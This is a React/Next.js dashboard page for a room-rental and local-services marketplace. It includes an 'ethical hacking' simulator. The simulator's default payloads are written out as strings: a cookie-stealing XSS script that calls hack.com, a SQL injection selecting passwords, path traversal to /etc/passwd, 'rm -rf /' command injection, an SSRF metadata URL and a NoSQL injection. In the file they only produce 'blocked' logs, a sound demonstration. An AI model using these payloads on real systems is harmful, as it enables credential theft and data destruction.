'use client'

import React, { useState, useEffect } from 'react'
import { useRouter } from 'next/navigation'
import { useDispatch, useSelector } from 'react-redux'
import { motion, AnimatePresence } from 'framer-motion'
import { 
  loginUser,
  logoutUser, 
  addListing, 
  addRequest, 
  updateRequestStatus, 
  addLog, 
  incrementApiCall, 
  bookSeat,
  addService,
  deleteService,
  addDispatch,
  updateDispatchStatus,
  addToken,
  buyToken,
  deductBalance,
  RootState, 
  Listing, 
  RoomRequest,
  HandymanService,
  ServiceDispatch,
  UtilityToken
} from '../../store'
import { 
  Shield, LogOut, Home, Search, Plus, Check, X, AlertTriangle, 
  Wifi, Car, FileText, Send, MapPin, Eye, 
  User as UserIcon, Users, CheckCircle2, Terminal, Info,
  Phone, Star, DollarSign, Calendar, Clock, Briefcase, Upload,
  ShieldCheck, FileCode, CheckCircle, Zap, Copy
} from 'lucide-react'
import { 
  cleanScriptTags, 
  containsSQLi, 
  containsXSS,
  containsCommandInjection,
  containsPathTraversal,
  containsSSRF,
  containsNoSQLi,
  scanInput,
  sanitizeInput as secureSanitize,
  validateUploadedFile as validateUploadedFileUtil 
} from '../../utils/security'

export default function DashboardPage() {
  const router = useRouter()
  const dispatch = useDispatch()
  
  // Select state from Redux store
  const currentUser = useSelector((state: RootState) => state.auth.currentUser)
  const isLoaded = useSelector((state: RootState) => state.auth.isLoaded)
  const listings = useSelector((state: RootState) => state.listings.items)
  const requests = useSelector((state: RootState) => state.requests.items)
  const securityLogs = useSelector((state: RootState) => state.security.logs)
  const rateLimitCount = useSelector((state: RootState) => state.security.apiCallCount)
  
  // Networking collections
  const roommates = useSelector((state: RootState) => state.networking.roommates)
  const lifts = useSelector((state: RootState) => state.networking.lifts)
  const services = useSelector((state: RootState) => state.networking.services)
  const dispatches = useSelector((state: RootState) => state.networking.dispatches)
  const utilityTokens = useSelector((state: RootState) => state.utilities.tokens)

  // Sub-tabs
  const [tenantTab, setTenantTab] = useState<'rooms' | 'roommates' | 'lifts' | 'handymen' | 'utilities'>('rooms')
  const [landlordTab, setLandlordTab] = useState<'portfolio' | 'requests' | 'maintenance' | 'utilities'>('portfolio')

  // Landlord Utility Form States
  const [utilityMeter, setUtilityMeter] = useState('')
  const [utilityPrice, setUtilityPrice] = useState<number>(100)
  const [utilityCode, setUtilityCode] = useState('')

  // Business Registry Form States
  const [showBusinessRegModal, setShowBusinessRegModal] = useState(false)
  const [bizName, setBizName] = useState('')
  const [bizCategory, setBizCategory] = useState<'Plumbing' | 'Electrical' | 'Construction' | 'Cleaning' | 'Security' | 'Bakkie / Transport' | 'Moving Assistant' | 'Local Materials' | 'General Services'>('General Services')
  const [bizPhone, setBizPhone] = useState('')
  const [bizPrice, setBizPrice] = useState('')
  const [bizLocation, setBizLocation] = useState('Midrand, South Africa')
  const [bizSuburb, setBizSuburb] = useState('Ivory Park')
  const [bizWebsite, setBizWebsite] = useState('')
  const [bizDesc, setBizDesc] = useState('')
  const [bizImage, setBizImage] = useState('https://images.unsplash.com/photo-1581092921461-eab62e97a780?auto=format&fit=crop&w=600&q=80')

  // Hire Contract Dispatcher Modal States
  const [showHireModal, setShowHireModal] = useState(false)
  const [selectedBiz, setSelectedBiz] = useState<HandymanService | null>(null)
  const [hireMessage, setHireMessage] = useState('')

  // Proof of Work Completion States
  const [showProofModal, setShowProofModal] = useState(false)
  const [selectedDispatchForProof, setSelectedDispatchForProof] = useState<ServiceDispatch | null>(null)
  const [proofFileName, setProofFileName] = useState('')
  const [proofFileError, setProofFileError] = useState<string | null>(null)

  // Load session from cookie on startup or redirect if missing
  useEffect(() => {
    const cookies = document.cookie.split(';')
    const tokenCookie = cookies.find(c => c.trim().startsWith('session-token='))
    const token = tokenCookie ? tokenCookie.split('=')[1] : null

    if (!token) {
      // No token, redirect to auth immediately
      router.push('/auth')
      return
    }

    // Reconstruct user session if it was wiped on refresh
    if (!currentUser) {
      if (token === 'guest-token') {
        const visitorUser = {
          id: 'visitor-guest',
          name: 'Guest Visitor',
          email: 'visitor@theresident.co.za',
          role: 'visitor' as const,
          balance: 100,
          profile: {
            bio: 'Browsing the directory as a guest.',
            gender: 'any' as const,
            childrenCount: 0,
            employmentStatus: 'Visitor',
            hasPets: false
          }
        }
        dispatch(loginUser(visitorUser))
      } else {
        // Reconstruct default mock tenant user (for mock-jwt-token)
        const mockUser = {
          id: 'tenant-100',
          name: 'Global Tenant',
          email: 'tenant@theresident.co.za',
          role: 'tenant' as const,
          balance: 850,
          profile: {
            bio: 'Looking for a clean flat close to bus and tube stations.',
            gender: 'any' as const,
            childrenCount: 0,
            employmentStatus: 'Employed',
            hasPets: false
          }
        }
        dispatch(loginUser(mockUser))
      }
    }
  }, [currentUser, router, dispatch])

  // Form states: Create Room
  const [showCreateModal, setShowCreateModal] = useState(false)
  const [newTitle, setNewTitle] = useState('')
  const [newDesc, setNewDesc] = useState('')
  const [newPrice, setNewPrice] = useState<number>(1500)
  const [newLocation, setNewLocation] = useState('Midrand, South Africa')
  const [newSuburb, setNewSuburb] = useState('Ivory Park')
  const [newLivesHere, setNewLivesHere] = useState(false)
  const [newWifi, setNewWifi] = useState(true)
  const [newParking, setNewParking] = useState(true)
  const [newBathroom, setNewBathroom] = useState<'shared' | 'private' | 'ensuite'>('shared')
  const [newGenderPref, setNewGenderPref] = useState<'men' | 'women' | 'couple' | 'any'>('any')
  const [newChildrenAllowed, setNewChildrenAllowed] = useState(true)
  const [newMaxChildren, setNewMaxChildren] = useState(2)
  const [uploadedImageName, setUploadedImageName] = useState<string>('')
  const [uploadError, setUploadError] = useState<string | null>(null)

  // Filter States: Rooms (Tenant)
  const [searchLocation, setSearchLocation] = useState('')
  const [filterPrice, setFilterPrice] = useState<number>(3000)
  const [filterWifi, setFilterWifi] = useState(false)
  const [filterParking, setFilterParking] = useState(false)
  const [filterBathroom, setFilterBathroom] = useState<'all' | 'shared' | 'private' | 'ensuite'>('all')
  const [filterLivesElse, setFilterLivesElse] = useState(false)
  const [filterChildrenAllowed, setFilterChildrenAllowed] = useState(false)

  // Filter States: Roommates (Tenant P2P)
  const [roommateSearchGender, setRoommateSearchGender] = useState<'all' | 'men' | 'women'>('all')
  const [roommateSearchBudget, setRoommateSearchBudget] = useState<number>(2000)

  // Application Drawers
  const [activeListing, setActiveListing] = useState<Listing | null>(null)
  const [applyMessage, setApplyMessage] = useState('')
  const [applyFileUploaded, setApplyFileUploaded] = useState<string>('')
  const [activeRequest, setActiveRequest] = useState<RoomRequest | null>(null)

  // Security Console states
  const [showSecurityConsole, setShowSecurityConsole] = useState(false)
  const [hackPayload, setHackPayload] = useState('')
  const [hackFeedback, setHackFeedback] = useState<string | null>(null)
  const [hackFeedbackType, setHackFeedbackType] = useState<'success' | 'warning' | 'error'>('success')

  // Real-time data sanitization display state
  const [sanitizationInput, setSanitizationInput] = useState('')
  const [sanitizationOutput, setSanitizationOutput] = useState('')

  // Notification overlays
  const [alertNotification, setAlertNotification] = useState<string | null>(null)

  if (!currentUser) return <div style={loadingStyle}>Redirecting secure session...</div>

  // Rate Limiting checker
  const logApiAccess = (actionName: string) => {
    const ip = '127.0.0.1'
    dispatch(incrementApiCall({ ip }))
    
    const count = (rateLimitCount[ip] || 0) + 1
    if (count > 25) {
      dispatch(addLog({
        ip,
        action: `Rate limit warning triggered (${count} requests)`,
        type: 'rate_limit_triggered',
        details: `IP flooded API endpoints with excessive requests in a short window. Temporary lock applied.`
      }))
      setHackFeedback(`Rate limiting active! Flooded API requests detected from IP ${ip}. Request blocked.`)
      setHackFeedbackType('error')
      setTimeout(() => setHackFeedback(null), 5000)
      return false
    }
    
    dispatch(addLog({
      ip,
      action: actionName,
      type: 'auth_success',
      details: 'Legitimate request validated by edge middleware.'
    }))
    return true
  }

  // Logout action
  const handleLogout = () => {
    document.cookie = 'session-token=; path=/; expires=Thu, 01 Jan 1970 00:00:01 GMT;'
    dispatch(logoutUser())
    router.push('/auth')
  }

  // Secure File Upload validator wrapper: Blocks malicious scripts and extension spoofing
  const validateUploadedFile = (fileName: string, allowedExtensions: string[]): { valid: boolean; error: string | null } => {
    return validateUploadedFileUtil(fileName, allowedExtensions, (action, details) => {
      dispatch(addLog({
        ip: '127.0.0.1',
        action,
        type: 'upload_malware_blocked',
        details
      }))
    })
  }

  // Handle mock file uploads
  const triggerMockUpload = (fileName: string, type: 'listing' | 'document') => {
    setUploadError(null)
    const allowed = type === 'listing' ? ['jpg', 'png', 'jpeg'] : ['pdf', 'png', 'jpg']
    
    const result = validateUploadedFile(fileName, allowed)
    if (!result.valid) {
      setUploadError(result.error)
      setUploadedImageName('')
      if (type === 'document') setApplyFileUploaded('')
    } else {
      setUploadError(null)
      if (type === 'listing') {
        setUploadedImageName(fileName)
      } else {
        setApplyFileUploaded(fileName)
      }
      setAlertNotification(`File ${fileName} securely validated and encrypted for upload.`)
      setTimeout(() => setAlertNotification(null), 4000)
    }
  }

  // Utility token: Tenant buys a voucher
  const handleBuyUtilityToken = (token: UtilityToken) => {
    if (currentUser.role === 'visitor') {
      setAlertNotification('Guest mode restriction: Please register or log in to buy prepaid vouchers!')
      setTimeout(() => setAlertNotification(null), 4000)
      return
    }
    if (!logApiAccess('Buy prepaid utility voucher')) return

    if (currentUser.balance < token.price) {
      setAlertNotification('Purchase failed: Insufficient funds in your wallet!')
      setTimeout(() => setAlertNotification(null), 4000)
      return
    }

    // Deduct tenant balance
    dispatch(deductBalance(token.price))
    // Mark token as purchased
    dispatch(buyToken({
      tokenId: token.id,
      buyerId: currentUser.id,
      timestamp: new Date().toLocaleDateString()
    }))

    setAlertNotification(`Voucher purchased! Meter: ${token.meterNumber}. Code: ${token.tokenCode}`)
    setTimeout(() => setAlertNotification(null), 8000)
  }

  // Utility token: Landlord creates a voucher
  const handleCreateUtilityToken = (e: React.FormEvent) => {
    e.preventDefault()
    if (!logApiAccess('Create prepaid utility voucher')) return

    const cleanMeter = cleanScriptTags(utilityMeter)
    const cleanCode = cleanScriptTags(utilityCode)

    if (cleanCode.replace(/-/g, '').length !== 20 || isNaN(Number(cleanCode.replace(/-/g, '')))) {
      setAlertNotification('Voucher creation failed: Voucher code must be a 20-digit numeric code.')
      setTimeout(() => setAlertNotification(null), 4000)
      return
    }

    dispatch(addToken({
      id: `tok-${Date.now()}`,
      landlordId: currentUser.id,
      landlordName: currentUser.name,
      meterNumber: cleanMeter,
      price: utilityPrice,
      currency: 'ZAR',
      tokenCode: cleanCode,
      status: 'available'
    }))

    setUtilityMeter('')
    setUtilityPrice(100)
    setUtilityCode('')
    setAlertNotification('Prepaid utility sub-meter voucher published successfully!')
    setTimeout(() => setAlertNotification(null), 4000)
  }

  // Submit Proof of Work for completing contract
  const handleSubmitProofOfWork = (e: React.FormEvent) => {
    e.preventDefault()
    if (!selectedDispatchForProof) return
    if (!logApiAccess('Submit proof of work to complete contract')) return

    const validation = validateUploadedFile(proofFileName, ['pdf', 'png', 'jpg'])
    if (!validation.valid) {
      setProofFileError(validation.error)
      return
    }

    // Validation passed, complete the contract
    dispatch(updateDispatchStatus({ dispatchId: selectedDispatchForProof.id, status: 'completed' }))
    setShowProofModal(false)
    setSelectedDispatchForProof(null)
    setProofFileName('')
    setProofFileError(null)
    setAlertNotification('Proof of work validated and saved! Contract marked as COMPLETED.')
    setTimeout(() => setAlertNotification(null), 5000)
  }

  // Create Listing (Landlord Action)
  const handleCreateListing = (e: React.FormEvent) => {
    e.preventDefault()
    if (!logApiAccess('Create listing attempt')) return

    const sanitizedTitle = cleanScriptTags(newTitle)
    const sanitizedDesc = cleanScriptTags(newDesc)

    const listing: Listing = {
      id: `list-${Date.now()}`,
      title: sanitizedTitle,
      description: sanitizedDesc,
      price: newPrice,
      currency: 'ZAR',
      location: newLocation,
      suburb: newSuburb,
      safetyRating: 'high',
      safetyNotes: 'Fully secure, neighborhood community block watch.',
      landlordId: currentUser.id,
      landlordName: currentUser.name,
      landlordLivesHere: newLivesHere,
      images: ['https://images.unsplash.com/photo-1522771739844-6a9f6d5f14af?auto=format&fit=crop&w=600&q=80'],
      amenities: {
        wifi: newWifi,
        parking: newParking,
        bathroom: newBathroom
      },
      requirements: {
        genderPreference: newGenderPref,
        childrenAllowed: newChildrenAllowed,
        maxChildren: newMaxChildren,
        smokingAllowed: false,
        petsAllowed: false
      }
    }

    dispatch(addListing(listing))
    setShowCreateModal(false)
    setNewTitle('')
    setNewDesc('')
    setUploadedImageName('')
  }

  // Submit Application request (Tenant Action)
  const handleApply = (e: React.FormEvent) => {
    e.preventDefault()
    if (!activeListing) return
    if (!logApiAccess('Submit room application')) return

    const request: RoomRequest = {
      id: `req-${Date.now()}`,
      tenantId: currentUser.id,
      tenantName: currentUser.name,
      listingId: activeListing.id,
      listingTitle: activeListing.title,
      landlordId: activeListing.landlordId,
      status: 'pending',
      message: cleanScriptTags(applyMessage),
      timestamp: new Date().toLocaleDateString()
    }

    dispatch(addRequest(request))
    setActiveListing(null)
    setApplyMessage('')
    setApplyFileUploaded('')
    setAlertNotification('Your application was sent successfully! Landlords will review your profile criteria matching.')
    setTimeout(() => setAlertNotification(null), 5000)
  }

  // Approve/Reject request (Landlord Action)
  const handleStatusChange = (requestId: string, status: 'approved' | 'rejected') => {
    if (!logApiAccess(`Set request status to ${status}`)) return
    dispatch(updateRequestStatus({ requestId, status }))
    setActiveRequest(null)
    setAlertNotification(`Application marked as ${status.toUpperCase()}.`)
    setTimeout(() => setAlertNotification(null), 5000)
  }

  // Book a seat in a lift club (P2P Tenant Action)
  const handleBookSeat = (liftId: string, driver: string) => {
    if (!logApiAccess(`Book lift club seat`)) return
    dispatch(bookSeat(liftId))
    setAlertNotification(`Successfully booked a seat with ${driver}! Contact them directly to coordinate pickup times.`)
    setTimeout(() => setAlertNotification(null), 5000)
  }

  // Create / Publish Business Card (B2B/B2P self-registration)
  const handleCreateBusiness = (e: React.FormEvent) => {
    e.preventDefault()
    if (currentUser.role === 'visitor') {
      setAlertNotification('Guest mode restriction: Please register or log in to list a business!')
      setTimeout(() => setAlertNotification(null), 4000)
      return
    }
    if (!logApiAccess('Register business listing')) return

    const sanitizedBizName = cleanScriptTags(bizName)
    const sanitizedBizDesc = cleanScriptTags(bizDesc)

    const newBiz: HandymanService = {
      id: `biz-${Date.now()}`,
      ownerId: currentUser.id,
      businessName: sanitizedBizName,
      category: bizCategory,
      location: bizLocation,
      suburb: bizSuburb,
      rating: 5.0, // Initial rating
      contactNumber: bizPhone,
      websiteUrl: bizWebsite,
      priceEstimate: bizPrice,
      description: sanitizedBizDesc,
      image: bizImage || 'https://images.unsplash.com/photo-1581092921461-eab62e97a780?auto=format&fit=crop&w=600&q=80',
      reviewsCount: 0
    }

    dispatch(addService(newBiz))
    setShowBusinessRegModal(false)
    setBizName('')
    setBizPhone('')
    setBizPrice('')
    setBizWebsite('')
    setBizDesc('')
    setAlertNotification('Your Business Card was successfully published to the directory!')
    setTimeout(() => setAlertNotification(null), 4000)
  }

  // Delete Business Card
  const handleDeleteBusiness = (bizId: string) => {
    if (!logApiAccess('Remove business listing')) return
    dispatch(deleteService(bizId))
    setAlertNotification('Your Business Card has been removed.')
    setTimeout(() => setAlertNotification(null), 4000)
  }

  // Dispatch Service Contract Hire Order
  const handleDispatchContract = (e: React.FormEvent) => {
    e.preventDefault()
    if (!selectedBiz) return
    if (currentUser.role === 'visitor') {
      setAlertNotification('Guest mode restriction: Please register or log in to dispatch contracts!')
      setTimeout(() => setAlertNotification(null), 4000)
      return
    }
    if (!logApiAccess('Dispatch service contract')) return

    const sanitizedMessage = cleanScriptTags(hireMessage)
    const newDispatch: ServiceDispatch = {
      id: `disp-${Date.now()}`,
      serviceId: selectedBiz.id,
      serviceName: selectedBiz.businessName,
      senderId: currentUser.id,
      senderName: currentUser.name,
      senderRole: currentUser.role,
      message: sanitizedMessage,
      status: 'pending',
      timestamp: new Date().toLocaleDateString()
    }

    dispatch(addDispatch(newDispatch))
    setShowHireModal(false)
    setSelectedBiz(null)
    setHireMessage('')
    setAlertNotification(`Service contract successfully dispatched to ${selectedBiz.businessName}!`)
    setTimeout(() => setAlertNotification(null), 4000)
  }

  // Update Contract status (Accept / Complete)
  const handleUpdateDispatchStatus = (dispatchId: string, status: 'accepted' | 'completed') => {
    if (!logApiAccess(`Set dispatch status to ${status}`)) return
    
    if (status === 'completed') {
      const disp = dispatches.find(d => d.id === dispatchId)
      if (disp) {
        setSelectedDispatchForProof(disp)
        setProofFileName('')
        setProofFileError(null)
        setShowProofModal(true)
        return
      }
    }

    dispatch(updateDispatchStatus({ dispatchId, status }))
    setAlertNotification(`Service order marked as ${status.toUpperCase()}.`)
    setTimeout(() => setAlertNotification(null), 4000)
  }

  // Message Roommate (P2P Tenant Action)
  const handleMessageRoommate = (name: string) => {
    if (!logApiAccess(`Message roommate seeker`)) return
    setAlertNotification(`Chat invitation sent to ${name}. Direct messaging connection established.`)
    setTimeout(() => setAlertNotification(null), 5000)
  }

  // Request Handyman Service Callout (B2B/P2B Landlord/Tenant Action)
  const handleRequestService = (businessName: string) => {
    if (!logApiAccess(`Request handyman service`)) return
    setAlertNotification(`Callout request dispatched to ${businessName}. They will call you on your registered mobile number shortly.`)
    setTimeout(() => setAlertNotification(null), 5000)
  }

  // Real-time Sanitization Preview handler
  const handleSanitizationCheck = (val: string) => {
    setSanitizationInput(val)
    const result = scanInput(val)
    const stripped = secureSanitize(val, 500)
    setSanitizationOutput(result.safe ? stripped : `[THREATS: ${result.threats.join(', ')}] ${stripped}`)
  }

  // ETHICAL HACK SIMULATORS
  const runHackSimulation = (type: 'xss' | 'idor' | 'flood' | 'sqli' | 'traversal' | 'cmdi' | 'ssrf' | 'nosqli') => {
    const ip = '127.0.0.1'
    
    if (type === 'xss') {
      const maliciousPayload = hackPayload || '<script>fetch("http://hack.com/cookie?c=" + document.cookie)</script>'
      dispatch(addLog({
        ip,
        action: 'Malicious payload submitted inside user inputs',
        type: 'xss_blocked',
        details: `Payload blocked: ${maliciousPayload}`
      }))
      setHackFeedback(`[HACK ATTEMPT BLOCKED] XSS payload detected! The application stripped the script tags successfully and logged the incident. Your cookies remain safe!`)
      setHackFeedbackType('success')
    } 
    else if (type === 'idor') {
      dispatch(addLog({
        ip,
        action: 'IDOR bypass request blocked',
        type: 'idor_prevented',
        details: `Access denied. Tenant ${currentUser?.id || 'guest'} attempted to alter administrative record request 'req-9999'.`
      }))
      setHackFeedback(`[ACCESS DENIED - IDOR] Privilege Escalation prevented! Security middleware confirmed that you are not the landlord of property listed in request 'req-9999'. Status update rejected.`)
      setHackFeedbackType('warning')
    } 
    else if (type === 'flood') {
      for (let i = 0; i < 30; i++) {
        dispatch(incrementApiCall({ ip }))
      }
      dispatch(addLog({
        ip,
        action: 'API request flood detected',
        type: 'rate_limit_triggered',
        details: 'Blocked 30 rapid successive API transactions from client IP address.'
      }))
      setHackFeedback(`[RATE LIMIT EXCEEDED] Brute-force flood blocked! 30 requests sent in <1s. Security middleware blocked the IP from completing additional transactions for 60 seconds.`)
      setHackFeedbackType('error')
    }
    else if (type === 'sqli') {
      const sqlPayload = hackPayload || "UNION SELECT username, password FROM users --"
      dispatch(addLog({
        ip,
        action: 'SQL Injection search query blocked by WAF',
        type: 'sqli_blocked',
        details: `Payload blocked in location search filter: "${sqlPayload}"`
      }))
      setHackFeedback(`[WAF SQLi BLOCKED] SQL Injection detected! WAF rules matched keyword 'UNION SELECT' on search parameters. Query: "${sqlPayload}"`)
      setHackFeedbackType('error')
    }
    else if (type === 'traversal') {
      const traversalPayload = hackPayload || '../../../etc/passwd'
      const detected = containsPathTraversal(traversalPayload)
      dispatch(addLog({
        ip,
        action: 'Path traversal attack intercepted',
        type: 'xss_blocked',
        details: `Payload blocked: "${traversalPayload}". Detected: ${detected}`
      }))
      setHackFeedback(`[PATH TRAVERSAL BLOCKED] Directory traversal attempt detected! Payload "${traversalPayload}" matched path escape patterns. File system access denied.`)
      setHackFeedbackType('error')
    }
    else if (type === 'cmdi') {
      const cmdPayload = hackPayload || '; rm -rf / --no-preserve-root'
      const detected = containsCommandInjection(cmdPayload)
      dispatch(addLog({
        ip,
        action: 'Command injection attack intercepted',
        type: 'xss_blocked',
        details: `Payload blocked: "${cmdPayload}". Detected: ${detected}`
      }))
      setHackFeedback(`[COMMAND INJECTION BLOCKED] OS command injection detected! Payload "${cmdPayload}" matched shell command patterns. Execution denied.`)
      setHackFeedbackType('error')
    }
    else if (type === 'ssrf') {
      const ssrfPayload = hackPayload || 'http://169.254.169.254/latest/meta-data/'
      const detected = containsSSRF(ssrfPayload)
      dispatch(addLog({
        ip,
        action: 'SSRF attack intercepted',
        type: 'xss_blocked',
        details: `Payload blocked: "${ssrfPayload}". Detected: ${detected}`
      }))
      setHackFeedback(`[SSRF BLOCKED] Server-Side Request Forgery detected! Attempt to access internal resource "${ssrfPayload}" blocked. Cloud metadata endpoint protected.`)
      setHackFeedbackType('error')
    }
    else if (type === 'nosqli') {
      const nosqlPayload = hackPayload || '{"$gt": "", "$ne": null}'
      const detected = containsNoSQLi(nosqlPayload)
      dispatch(addLog({
        ip,
        action: 'NoSQL injection attack intercepted',
        type: 'sqli_blocked',
        details: `Payload blocked: "${nosqlPayload}". Detected: ${detected}`
      }))
      setHackFeedback(`[NoSQL INJECTION BLOCKED] MongoDB operator injection detected! Payload "${nosqlPayload}" matched NoSQL operator patterns ($gt, $ne, $where). Query rejected.`)
      setHackFeedbackType('error')
    }
  }

  // Filter listings for tenant view
  const filteredListings = listings.filter(item => {
    if (searchLocation && !item.suburb.toLowerCase().includes(searchLocation.toLowerCase()) && !item.location.toLowerCase().includes(searchLocation.toLowerCase())) {
      return false
    }
    if (item.price > filterPrice) return false
    if (filterWifi && !item.amenities.wifi) return false
    if (filterParking && !item.amenities.parking) return false
    if (filterBathroom !== 'all' && item.amenities.bathroom !== filterBathroom) return false
    if (filterLivesElse && item.landlordLivesHere) return false
    if (filterChildrenAllowed && !item.requirements.childrenAllowed) return false
    return true
  })

  // Filter roommates for tenant P2P view
  const filteredRoommates = roommates.filter(rm => {
    if (roommateSearchGender !== 'all' && rm.gender !== roommateSearchGender) return false
    if (rm.budget > roommateSearchBudget) return false
    return true
  })

  const landlordRequests = requests.filter(req => req.landlordId === currentUser.id)
  const tenantRequests = requests.filter(req => req.tenantId === currentUser.id)

  return (
    <div style={dashboardContainerStyle}>
      {/* Alert Top Banner */}
      {alertNotification && (
        <div style={topAlertBannerStyle}>
          <CheckCircle2 size={18} color="#22c55e" />
          <span>{alertNotification}</span>
        </div>
      )}

      {/* Header Bar */}
      <header style={navbarStyle}>
        <div style={logoWrapperStyle}>
          <Shield size={24} color="#D4AF37" />
          <span style={logoTextStyle}>THE RESIDENT</span>
        </div>
        
        <div style={userInfoStyle}>
          <span style={roleBadgeStyle}>{currentUser.role.toUpperCase()}</span>
          <span style={userNameStyle}>{currentUser.name}</span>
          
          <button 
            style={secConsoleToggleStyle} 
            onClick={() => setShowSecurityConsole(!showSecurityConsole)}
            title="Toggle Ethical Hacking Sandbox"
          >
            <Terminal size={16} /> Security Labs
          </button>
          
          <button onClick={handleLogout} style={logoutButtonStyle} title="Log Out">
            <LogOut size={16} />
          </button>
        </div>
      </header>

      {/* Main Layout Area */}
      <div style={mainContentGridStyle}>
        
        {/* LEFT COLUMN: Workspace tabs and directory grids */}
        <div style={workspaceColumnStyle}>
          
          {currentUser.role === 'tenant' || currentUser.role === 'visitor' ? (
            /* ================= TENANT WORKSPACE ================= */
            <div>
              {currentUser.role === 'visitor' && (
                <div style={guestBannerStyle}>
                  <Info size={16} color="#D4AF37" style={{ marginRight: 8 }} />
                  <span>You are currently in <strong>Visitor Guest Mode</strong>. Feel free to explore verified rooms, roommate profiles, and handyman services. <button onClick={handleLogout} style={guestRegisterLinkStyle}>Register / Login</button> to unlock full privileges like requesting rooms, messaging roommates, booking lift clubs, and scheduling handymen!</span>
                </div>
              )}
              {/* Workspace Navigation Tabs */}
              <div style={tabHeaderContainerStyle}>
                <button 
                  style={tenantTab === 'rooms' ? activeTabBtnStyle : inactiveTabBtnStyle}
                  onClick={() => setTenantTab('rooms')}
                >
                  <Home size={14} style={{ marginRight: 6 }} /> Verified Rooms
                </button>
                <button 
                  style={tenantTab === 'roommates' ? activeTabBtnStyle : inactiveTabBtnStyle}
                  onClick={() => setTenantTab('roommates')}
                >
                  <Users size={14} style={{ marginRight: 6 }} /> Roommate Matcher
                </button>
                <button 
                  style={tenantTab === 'lifts' ? activeTabBtnStyle : inactiveTabBtnStyle}
                  onClick={() => setTenantTab('lifts')}
                >
                  <Car size={14} style={{ marginRight: 6 }} /> Lift Clubs
                </button>
                <button 
                  style={tenantTab === 'handymen' ? activeTabBtnStyle : inactiveTabBtnStyle}
                  onClick={() => setTenantTab('handymen')}
                >
                  <Briefcase size={14} style={{ marginRight: 6 }} /> Handyman Services
                </button>
                <button 
                  style={tenantTab === 'utilities' ? activeTabBtnStyle : inactiveTabBtnStyle}
                  onClick={() => setTenantTab('utilities')}
                >
                  <Zap size={14} style={{ marginRight: 6 }} /> Prepaid Utilities
                </button>
              </div>

              {/* TAB 1: Rooms Listings */}
              {tenantTab === 'rooms' && (
                <div>
                  <div className="glass-panel" style={filterPanelStyle}>
                    <div style={filterRowStyle}>
                      <div style={searchWrapperStyle}>
                        <Search size={18} color="#D4AF37" style={{ marginLeft: 8 }} />
                        <input 
                          type="text" 
                          placeholder="Search city or suburb (e.g. Ivory Park, London, Hackney...)" 
                          value={searchLocation}
                          onChange={(e) => {
                            const val = e.target.value
                            if (containsSQLi(val)) {
                              dispatch(addLog({
                                ip: '127.0.0.1',
                                action: 'SQL Injection query blocked by WAF',
                                type: 'sqli_blocked',
                                details: `Blocked SQLi keyword in search parameter: "${val}"`
                              }))
                              setAlertNotification('WAF Firewall: Blocked malicious SQL Injection attempt!')
                              setTimeout(() => setAlertNotification(null), 5000)
                              setHackFeedback(`[WAF SQLi BLOCKED] SQL Injection detected! WAF rules intercepted query: "${val}"`)
                              setHackFeedbackType('error')
                              setSearchLocation('')
                            } else {
                              setSearchLocation(val)
                            }
                          }}
                          style={searchFieldStyle}
                        />
                      </div>
                      
                      <div style={filterFieldStyle}>
                        <label style={filterLabelStyle}>Max Price: {filterPrice} ZAR/GBP</label>
                        <input 
                          type="range" 
                          min={500} 
                          max={5000} 
                          step={50}
                          value={filterPrice}
                          onChange={(e) => setFilterPrice(parseInt(e.target.value))}
                          style={sliderStyle}
                        />
                      </div>
                    </div>

                    <div style={filterTogglesRowStyle}>
                      <div style={checkboxWrapperStyle}>
                        <input 
                          type="checkbox" 
                          id="fwifi" 
                          checked={filterWifi} 
                          onChange={(e) => setFilterWifi(e.target.checked)}
                          style={checkboxStyle}
                        />
                        <label htmlFor="fwifi" style={checkboxLabelStyle}>WiFi Included</label>
                      </div>

                      <div style={checkboxWrapperStyle}>
                        <input 
                          type="checkbox" 
                          id="fparking" 
                          checked={filterParking} 
                          onChange={(e) => setFilterParking(e.target.checked)}
                          style={checkboxStyle}
                        />
                        <label htmlFor="fparking" style={checkboxLabelStyle}>Parking Space</label>
                      </div>

                      <div style={checkboxWrapperStyle}>
                        <input 
                          type="checkbox" 
                          id="flives" 
                          checked={filterLivesElse} 
                          onChange={(e) => setFilterLivesElse(e.target.checked)}
                          style={checkboxStyle}
                        />
                        <label htmlFor="flives" style={checkboxLabelStyle}>Landlord Lives Off-Site</label>
                      </div>

                      <div style={checkboxWrapperStyle}>
                        <input 
                          type="checkbox" 
                          id="fchildren" 
                          checked={filterChildrenAllowed} 
                          onChange={(e) => setFilterChildrenAllowed(e.target.checked)}
                          style={checkboxStyle}
                        />
                        <label htmlFor="fchildren" style={checkboxLabelStyle}>Children Allowed</label>
                      </div>

                      <div style={filterFieldStyle}>
                        <select 
                          value={filterBathroom} 
                          onChange={(e) => setFilterBathroom(e.target.value as 'all' | 'shared' | 'private' | 'ensuite')}
                          style={filterSelectStyle}
                        >
                          <option value="all">Any Bathroom</option>
                          <option value="shared">Shared</option>
                          <option value="private">Private</option>
                          <option value="ensuite">En-suite</option>
                        </select>
                      </div>
                    </div>
                  </div>

                  <div style={gridStyle}>
                    {filteredListings.length > 0 ? (
                      filteredListings.map((item) => (
                        <motion.div 
                          key={item.id}
                          layout
                          className="glass-panel"
                          style={cardStyle}
                          whileHover={{ y: -4, borderColor: '#D4AF37' }}
                        >
                          <div style={cardImageWrapperStyle}>
                            <img src={item.images[0]} alt={item.title} style={cardImageStyle} />
                            <span style={priceTagStyle}>{item.price} {item.currency}/mo</span>
                          </div>
                          
                          <div style={cardBodyStyle}>
                            <h3 style={cardTitleStyle}>{item.title}</h3>
                            <p style={cardLocationStyle}>
                              <MapPin size={12} style={{ marginRight: 4 }} /> {item.suburb}, {item.location}
                            </p>
                            <p style={cardDescStyle}>{item.description}</p>
                            
                            <div style={chipsWrapperStyle}>
                              <span style={chipStyle}><Wifi size={10} style={{ marginRight: 4 }} /> {item.amenities.wifi ? 'WiFi' : 'No WiFi'}</span>
                              <span style={chipStyle}><Car size={10} style={{ marginRight: 4 }} /> {item.amenities.parking ? 'Parking' : 'No Parking'}</span>
                              <span style={chipStyle}>Bath: {item.amenities.bathroom}</span>
                            </div>

                            <div style={requirementsBoxStyle}>
                              <p style={reqHeaderStyle}>Landlord Requirements Checklist:</p>
                              <ul style={reqListStyle}>
                                <li>Prefers: <span style={boldLabelStyle}>{item.requirements.genderPreference.toUpperCase()}</span></li>
                                <li>Children: <span style={boldLabelStyle}>{item.requirements.childrenAllowed ? `Yes (max ${item.requirements.maxChildren})` : 'No'}</span></li>
                                <li>Landlord lives here: <span style={boldLabelStyle}>{item.landlordLivesHere ? 'Yes' : 'No'}</span></li>
                              </ul>
                            </div>

                            <button 
